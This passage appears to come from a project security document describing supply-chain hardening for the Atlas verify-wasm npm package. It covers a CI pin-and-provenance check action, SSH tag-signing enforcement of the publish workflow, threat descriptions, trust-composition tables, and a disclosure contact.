  preserves it for backward-compat alongside `packages`). A
  maliciously-crafted v1 lockfile with adversarially-deep nested
  `dependencies.X.dependencies.Y.dependencies...` could trigger
  V8 stack overflow in the recursive walker. Now uses the same
  queue-based + `WeakSet` cycle-detection pattern as the v7+
  walker (parity across both lockfile shapes). Plus a 10 MB file-
  size cap before `fs.readFileSync` (defends against runner OOM
  on a multi-gigabyte lockfile, matches the existing cap on
  bun-helper output).
- **Single `npm ls` invocation in Layer 3** (`check-provenance.sh`).
  First-pass code invoked `npm ls "$PACKAGE" --depth=0` twice —
  once for the precondition exit-code check, once for the
  diagnostic output capture on failure. A package install state
  could in principle change between the two calls (concurrent
  process, filesystem race), and at minimum it doubled the
  per-step latency. Refactored to a single invocation captured
  via `set +e` / `RC=$?` / `set -e` block. Atomic snapshot,
  half the latency.
- **JSONC unterminated-block-comment diagnostic in bun-text
  helper** (`check-lockfile-integrity-bun-text.sh`). The first-
  pass tokenizer would silently fall off the end of input on a
  truncated `/* ... ` block comment (no terminating `*/`),
  producing a bogus parse error elsewhere in the pipeline. Now
  throws with `unterminated /* … */ block comment in bun.lock at
  offset N` so a consumer debugging a corrupt lockfile gets the
  exact byte offset.
- **Layer-3 self-test workspace containment fix**
  (`.github/workflows/verify-wasm-pin-check-self-test.yml`,
  `live-install-layer-3` job). The first-pass workflow installed
  the live test consumer into `/tmp/atlas-pin-check-live` and
  passed an absolute `working-directory` to the action. The
  shared `lib/canonicalize-workdir.sh` (added in the first review
  pass) enforces `$GITHUB_WORKSPACE` containment — `/tmp/...` is
  outside the workspace, so the action exited at the setup step
  on the containment check, never reaching Layer 3. **Result: the
  self-test's only Layer-3 coverage was non-functional from
  first ship until this fix.** Fixed by relocating the install
  directory to `$GITHUB_WORKSPACE/.atlas-pin-check-live` and
  passing a relative `working-directory: .atlas-pin-check-live`
  (resolves inside workspace, passes containment check). Comment
  added explaining the constraint so a future refactor doesn't
  re-introduce the regression.
- **Expanded negative-case workflow matrix.** First-pass
  `action-negative-cases` job covered 6 negative fixtures. Added
  3 more — `npm-hyphen-range-bad`, `npm-not-installed`,
  `npm-empty-hash-payload` — for 9 negative fixtures total, so
  every distinct exit-path the action can fail on is exercised
  via `uses:` (action-level invocation), not just by direct
  script invocation in the harness. New harness cases bring the
  fixture-test count to **40 / 40**.

What scope-k does NOT cover (V1.18+ candidates):

- **Standalone `atlas-trust/verify-wasm-pin-check` repo with
  marketplace publishing.** scope-k uses the monorepo path
  `.github/actions/verify-wasm-pin-check/`. Marketplace publishing
  unlocks `@v1` major-version-tracking tags (vs. the current
  full-path `@v1.17.0` reference) and discoverability via
  GitHub's marketplace search. Deferred because marketplace
  publishing is itself a publish ceremony that needs its own
  trust-domain analysis (who controls the standalone repo, how
  releases are tagged, whether the repo is itself SLSA L3).
- **Auto-bump PR generation.** scope-k tells the consumer when
  their pin is stale relative to a target version (`expected-version`
  input) but does not open a PR to bump the pin. A future Welle
  could add an opt-in "if expected-version is set and the
  package.json pin is older, open a Renovate-style PR" mode.
  Deferred because bumping is a consumer policy decision (cadence,
  approval workflow) that should live in the consumer's tooling
  (Renovate, Dependabot), not in the verifier action itself.
- **Cross-package transitive provenance scan.** scope-k checks
  `@atlas-trust/verify-wasm` only. The Atlas WASM crate has no
  runtime npm dependencies (the WASM payload is the only artefact),
  so transitive-scan is structurally not needed for our package.
  A consumer who wants `npm audit signatures` against their entire
  tree should run the bare command — scope-k delegates the broader
  audit responsibility to the consumer.
- **Air-gapped / offline-mirror Layer 3 alternative.** Layer 3
  requires `registry.npmjs.org` + `rekor.sigstore.dev` reachability.
  Air-gapped consumer pipelines must set `skip-provenance: true`
  and accept the SLSA L3 layer is not enforced on every build (it
  was enforced at the install-time ceremony when the lockfile was
  generated). A future scope could ship a sigstore-bundle-as-file
  alternative (offline verification against a pre-fetched bundle),
  but that requires the publisher side to also publish the bundle
  artefact — a V1.18+ consideration tied to V1.15 Welle B's
  backup-channel composition.
- **Multi-package coverage in a single action invocation.** For
  monorepos with multiple Atlas-consuming packages, the action
  must be invoked once per package directory (with `working-directory:`
  pointing at each). A future scope could add a `discover` mode
  that walks the monorepo and runs all three layers per discovered
  `package.json`. Deferred because monorepo layouts are
  consumer-specific and a per-call action keeps the failure
  surface explicit.

### Trust composition with scope-d + V1.14 Scope E + V1.15 Welle B/C

scope-k is consumer-side cadence enforcement. It composes with — does
not replace — every prior trust layer:

| Layer | What it pins | Failure mode addressed |
|---|---|---|
| V1.5 `signing_input_byte_determinism_pin` | CBOR signing-input bytes | issuer-side encoding drift |
| V1.14 Scope E SLSA L3 OIDC provenance | npm tarball bytes ↔ Git commit | npm-registry compromise |
| V1.15 Welle B GH-Releases backup | second tarball channel | npm-registry outage |
| V1.15 Welle C consumer pinning runbook | install-time ceremony for npm / pnpm / Bun | cold-start mis-install |
| V1.16 scope-d (Wellen A+B+C) | playground delivery hardening | UI-side injection in hosted deployments |
| **V1.17 scope-k (Welle A) `verify-wasm-pin-check@v1`** | **CI-time re-assertion of all three §1 layers on every consumer build** | **consumer-side cadence drift between install-time ceremony and ongoing CI** |

scope-k pins the *cadence* of the consumer trust ceremony. Without it,
every layer is checked once at install time and then assumed to hold
across every subsequent CI build. With it, every layer is re-asserted
on every install with no possibility of skipping a step or forgetting
the audit ceremony — and the action's own pure-bash composite shape
means the verifier itself does not become a supply-chain risk worth
auditing (no opaque `dist/index.js` bundle, no transitive npm deps).

### Anti-drift

- **Self-test workflow** (`.github/workflows/verify-wasm-pin-check-self-test.yml`)
  re-runs the fixture harness AND a live `npm install --save-exact
  @atlas-trust/verify-wasm@latest` + full action invocation on every
  push / PR that touches the action, plus a weekly cron at
  `Mon 06:17 UTC` to catch Sigstore regressions independent of code.
- **Negative-case matrix** in the same workflow — six bad fixtures
  invoked via `continue-on-error: true` + `outcome != 'failure'`
  assertion. A regression that loosens any check (e.g. accepts a
  `^1.15.0` pin where it should reject) would fail at least one of
  these matrix legs.
- **Trust composition table row** in this document and in
  ARCHITECTURE.md V1.17 Welle A boundary block — a future scope
  that intends to deprecate scope-k must update both docs and the
  row above, providing a single discoverable trail for the
  decision.

---

## scope-l — Tag-Signing Enforcement (V1.17 Welle B — shipped)

V1.14 Scope E introduced the `wasm-publish.yml` workflow that fires on
`push: tags: ['v*']` and ships `@atlas-trust/verify-wasm` to npm with
SLSA L3 provenance. V1.15 Welle B extended the same trigger to upload
identical tarballs to GitHub Releases as a backup distribution channel.
Both publish lanes trust the *tag* — whoever can push a `v*` tag to the
canonical repo can fire the publish lane and place bytes on consumer
machines via the next `npm install`.

scope-l closes the structural failure mode that the previous trust
layers do not address: **the publish gate trusts that a `v*` tag was
authored by an authorised maintainer, but until V1.17 Welle B nothing
in the repo or workflow enforced that trust.** The threat is not
hypothetical — a single compromised maintainer GitHub PAT (push-on-
contents scope, no admin) is sufficient to push a `v*` tag pointing
at a smuggled commit, and the publish lane fires automatically.

Threats addressed:

- **F-5 (tag-authenticity gap).** Attacker holding `contents: write`
  on the repo (compromised maintainer PAT, account-takeover, or
  short-window-of-opportunity insider access) pushes a `v*` tag
  pointing at a commit they introduced (smuggled into a feature
  branch, never reviewed on master) or at a legitimate commit they
  intend to mis-attribute. `wasm-publish.yml` fires; npm publishes
  byte-identical-to-attacker-input bytes; SLSA L3 attestation
  correctly attributes the bytes to the GitHub Actions run, but the
  *commit* the run was triggered from was attacker-controlled. A
  consumer running V1.17 Welle A's `verify-wasm-pin-check@v1` would
  see Layer 3 PASS (the publish was OIDC-attested by a real run on
  the canonical repo) — the SLSA L3 layer was never designed to
  defend against in-repo tag-authoring.
- **F-5a (tag re-pointing).** Attacker with the same PAT scope
  force-pushes an existing `v*` tag onto a different commit. Without
  signed tags, the new commit is published-trusted on next workflow
  fire (e.g. via a re-run trigger).
- **F-5b (workflow-file mutation in unsigned-tag world).** A future
  attacker who lands a malicious change to `wasm-publish.yml` itself
  (e.g. removing the publish-gate guards) can ship without ever
  needing PAT access — branch protection on master is the defence,
  but a malicious tag pointing at a malicious commit before branch
  protection landed would already be live.

scope-l ships:

1. **`.github/allowed_signers`** — SSH public-key trust root in the
   canonical OpenSSH `allowed_signers` format (`<principal> <key-type>
   <base64>` per line). Initial entry: both ed25519 keys of the
   primary maintainer (sourced from `https://github.com/<user>.keys`
   at commit time). Adding/removing keys here is the addition/
   revocation ceremony.
2. **`tools/verify-tag-signatures.sh`** — pure-bash verifier (~190
   lines). Iterates `v*` tags (or specific tags passed as args), runs
   `git verify-tag` with `gpg.format=ssh` + `gpg.ssh.allowedSignersFile`
   pointed at `.github/allowed_signers`. Validates trust root is
   present + non-empty, validates git ≥ 2.34 (SSH-signing-aware),
   per-tag PASS/FAIL with stderr captured. Locally-runnable — a
   maintainer can verify before pushing, catching local-config drift
   before a CI red-fail.
3. **`tools/setup-tag-signing.sh`** — three subcommands (`init`,
   `add`, `status`) for the maintainer one-time setup + key-rotation
   ceremonies. `init --key auto` walks `~/.ssh/*.pub`, finds the
   first key whose body matches an entry in `.github/allowed_signers`,
   and configures local git (`gpg.format=ssh`, `user.signingkey`,
   `tag.gpgSign=true`, `gpg.ssh.allowedSignersFile`). Refuses to
   configure an untrusted key (defends "developer accidentally
   configures a key whose public counterpart isn't in the trust
   root and burns CI cycles before noticing").
4. **`.github/workflows/verify-tag-signatures.yml`** — standalone
   verification workflow. Triggers: `push: tags: ['v*']` (catches
   any tag push), weekly cron `Mon 06:37 UTC` (catches drift —
   expired keys, allowed_signers mutations, retroactive trust-root
   changes), `workflow_dispatch` (operator-on-demand re-verification),
   and `pull_request` on the tag-signing surfaces (regression catch
   on the verifier script + trust-root file). SHA-pinned `actions/
   checkout@v4.2.2` (no mutable-tag self-undermine — same rationale
   as V1.17 Welle A).
5. **First-step guard inside `wasm-publish.yml`** — defence-in-depth.
   Even if `verify-tag-signatures.yml` is paused, dispatch-disabled,
   or fails for a transient reason, `wasm-publish.yml` runs
   `tools/verify-tag-signatures.sh "$GITHUB_REF_NAME"` as its first
   real step (after `actions/checkout` with `fetch-depth: 0` +
   `fetch-tags: true`). Failure here exits the publish lane non-zero
   BEFORE any `npm publish` or GH-Release upload.
6. **`tools/test-tag-signatures.sh`** — anti-drift harness, 13 cases.
   Pure-bash, no fixtures-on-disk, every case built from scratch in
   a tempdir + torn down. Covers the trust-root validation paths
   (missing/empty/comments-only allowed_signers), the tag-existence
   check, the lightweight-tag rejection, the annotated-unsigned-tag
   rejection, the no-tags-yet early exit, and the
   `setup-tag-signing.sh` subcommand surface (status/usage/unknown
   subcommand/missing-args/deprecated-key-type rejection). The path
   we cannot cover here — "tag signed by trusted key → PASS" — is
   exercised live in the first `wasm-publish.yml` tag-push run plus
   maintainer-side `bash tools/verify-tag-signatures.sh vX.Y.Z`
   between `git tag -m '…'` and `git push`.

What scope-l does NOT cover (V1.18+ candidates):

- **Sigstore-keyless / `gitsign`-based tag signing.** SSH-based
  signing keeps the trust root in the repo, which is auditable but
  also means a compromised maintainer key signs validly until the
  rotation lands. Sigstore/gitsign binds tag signatures to the
  maintainer's GitHub OIDC identity (no long-lived signing key) and
  logs every signature to the public Rekor transparency log. The
  philosophy-coherent path forward — V1.17 Welle A already binds
  npm publish trust to Sigstore Rekor — but Sigstore tooling on
  Windows is rough enough today that V1.17 Welle B sticks with
  SSH. V1.18 candidate: dual-rail signing where both an SSH
  signature AND a Sigstore signature are produced, and CI accepts
  EITHER. Lets the maintainer transition without a hard cutover.
- **Branch-protection rule for `.github/allowed_signers`.** The
  trust-root file itself can be modified by anyone with `contents:
  write` on master. A future Welle could require commit-signing on
  changes to this file specifically, via a CODEOWNERS rule + branch
  protection requiring CODEOWNERS approval on `.github/allowed_signers`
  edits. Deferred because this is policy-side (GitHub repo settings),
  not in-repo-code-side.
- **Hardware-token enforcement.** All keys in `.github/allowed_signers`
  are equally trusted. A future Welle could enforce that signing
  keys are FIDO2-backed (`sk-ssh-ed25519@openssh.com` key type) by
  rejecting non-`sk-` types in the verifier. Deferred because the
  primary maintainer's current keys are software-keys; switching to
  hardware-backed is an additive future improvement.
- **Retroactive tag-signature timestamping.** scope-l verifies the
  signature against the *current* state of `.github/allowed_signers`.
  A maintainer key revocation invalidates past tags from the
  revocation forward (consumers cloning fresh see the verify-tag
  fail). For "this past tag was signed by a then-trusted key at
  the time of signing", the auditor would need to checkout the
  repo state at the tag's commit and run the verifier against that
  snapshot of allowed_signers. Documented in the OPERATOR-RUNBOOK
  §13 "revocation" subsection but not automated in CI.

### Trust composition with scope-e + V1.14 + V1.15 + scope-k

scope-l is publish-lane authentication. It composes with — does not
replace — every prior trust layer:

| Layer | What it pins | Failure mode addressed |
|---|---|---|
| V1.5 `signing_input_byte_determinism_pin` | CBOR signing-input bytes | issuer-side encoding drift |
| V1.14 Scope E SLSA L3 OIDC provenance | npm tarball bytes ↔ GitHub Actions run | npm-registry compromise |
| V1.15 Welle B GH-Releases backup | second tarball channel | npm-registry outage |
| V1.15 Welle C consumer pinning runbook | install-time ceremony for npm / pnpm / Bun | cold-start mis-install |
| V1.16 scope-d (Wellen A+B+C) | playground delivery hardening | UI-side injection in hosted deployments |
| V1.17 scope-k (Welle A) `verify-wasm-pin-check@v1` | CI-time re-assertion of all three §1 layers on every consumer build | consumer-side cadence drift between install-time ceremony and ongoing CI |
| **V1.17 scope-l (Welle B) Tag-Signing Enforcement** | **`v*` tag → maintainer SSH signature, gated inside `wasm-publish.yml`'s first step** | **publish-lane authentication: who can fire the publish via a `v*` push** |

scope-l pins *who can fire the publish lane*. Without it, the publish
trusts the GitHub-side tag-protection rules (operator-runbook level —
prone to drift between Settings UI state and the maintainer's mental
model). With it, the publish trusts an in-repo cryptographic trust
root — auditable, version-controlled, and verified inside the same
workflow run that fires the publish.

### Anti-drift

- **`tools/test-tag-signatures.sh` harness** — 13 cases, runs in
  ~5 seconds. Run before any change to `tools/verify-tag-signatures.sh`,
  `tools/setup-tag-signing.sh`, or `.github/allowed_signers`.
- **`verify-tag-signatures.yml` weekly cron** — re-verifies every
  `v*` tag in the repo against the current trust root every Monday
  at 06:37 UTC. Catches the drift cases (expired keys, retroactive
  trust-root edits, force-pushed tags).
- **First-step guard in `wasm-publish.yml`** — guarantees the
  publish lane cannot fire without a passing tag-signature check.
- **Trust composition table row** in this document, in
  ARCHITECTURE.md (V1.17 Welle B boundary block), and in
  CONSUMER-RUNBOOK.md §6 step 2 — a future scope that intends to
  deprecate scope-l must update all three docs and the row above.

---

## Reporting issues

Verifier vulnerabilities — bypasses, signature-acceptance bugs,
canonicalisation drift, side-channel leaks — should be disclosed
privately to nelson@ultranova.io. We will respond within 48 hours.

A vulnerability that lets a forged trace verify as `valid: true` is the
worst possible class of bug for this project; we take such reports
seriously and will publish a fix + advisory on a co-ordinated timeline.
